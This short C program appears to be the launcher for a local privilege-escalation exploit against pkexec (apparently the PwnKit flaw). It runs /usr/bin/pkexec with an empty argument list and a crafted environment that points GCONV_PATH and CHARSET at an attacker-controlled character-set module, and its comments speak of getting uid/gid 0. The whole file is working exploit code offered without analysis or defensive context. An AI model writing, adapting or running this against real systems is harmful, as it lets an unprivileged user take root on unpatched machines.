#include <unistd.h>

int main() {
	char *argv[] = {NULL};
	char *envp[] = {
		"pwn",
		/** this is where we force an error */
		"TERM=..",
		"PATH=GCONV_PATH=.",
		/** now we are changing the charset */
		"CHARSET=HCCpwn",
		NULL
	};

	/** g_printerr (the error) 'get's false and the code branches to else
	 *
	 * we have  the argument and environment set uid/gid to 0 */

	execve("/usr/bin/pkexec", argv, envp);

	return 0;

}


